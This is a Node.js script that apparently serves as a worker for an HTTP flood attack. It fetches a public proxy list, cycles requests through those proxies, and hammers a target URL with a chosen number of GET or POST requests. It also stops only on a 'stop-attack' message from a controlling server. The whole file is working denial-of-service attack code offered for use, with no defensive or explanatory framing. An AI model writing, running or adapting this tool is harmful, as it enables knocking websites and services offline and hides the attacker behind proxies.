const fs = require("fs");
const axios = require("axios");
const SocksProxyAgent = require("socks-proxy-agent");
const HttpsProxyAgent = require("https-proxy-agent");
const chalk = require("chalk");

let isAttacking = true;

process.on("message", (msg) => {
  if (msg === "stop-attack") {
    isAttacking = false;
    console.log("Attack stopped by server.");
    process.exit();
  }
});

const targetUrl = process.argv[2] || process.env.URL;
const method = process.argv[3] || process.env.METHOD;
const totalRequests = parseInt(process.argv[4]) || process.env.REQUESTS;
const proxyListFile = "./proxy.txt";
const delay = 100;
let currentRequests = 0;

if (!targetUrl || !method || !totalRequests || isNaN(totalRequests)) {
  console.error(
    chalk.red("Error: Please provide all the required parameters!"),
  );
  process.exit(1);
}

async function downloadProxyList() {
  if (!fs.existsSync(proxyListFile)) {
    try {
      const response = await axios.get(
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
      );
      fs.writeFileSync(proxyListFile, response.data);
      console.log(chalk.green("Proxy list downloaded and saved successfully."));
    } catch (error) {
      console.error(chalk.red(`Failed to download proxy list: ${error}`));
    }
  } else {
    console.log(chalk.green("Proxy list already exists. Skipping download."));
  }
}

function readProxyList() {
  try {
    const data = fs.readFileSync(proxyListFile, "utf8");
    const lines = data.trim().split("\n");
    return lines.map((line) => line.trim());
  } catch (error) {
    console.error(chalk.red(`Failed to read proxy list: ${error}`));
    return [];
  }
}

function sendRequest(target, agent) {
  const requestMethod = method.toUpperCase() === "GET" ? axios.get : axios.post;

  requestMethod(target, { httpAgent: agent })
    .then((response) => {
      console.log(chalk.green(`Attacking ${target}`));
      currentRequests++;
      if (currentRequests >= totalRequests) {
        console.log(chalk.yellow("Attack completed. Stopping..."));
        process.exit();
      }
    })
    .catch((error) => {
      console.error(
        chalk.red(`Error Attacking: ${target}\n\nReason:\n${error}`),
      );
    });
}

async function run() {
  if (isAttacking) {
    await downloadProxyList();
    const proxyList = readProxyList();
    let currentIndex = 0;

    async function connection() {
      if (currentIndex < proxyList.length) {
        const proxyUrl = proxyList[currentIndex];

        let agent;

        if (proxyUrl.startsWith("socks4") || proxyUrl.startsWith("socks5")) {
          agent = new SocksProxyAgent(proxyUrl);
        } else if (proxyUrl.startsWith("https")) {
          agent = new HttpsProxyAgent({ protocol: "http", proxy: proxyUrl });
        }

        sendRequest(targetUrl, agent);
        currentIndex++;
      } else {
        setTimeout(run, delay);
      }
    }

    connection();
    setTimeout(run, delay);
  }
}

run();
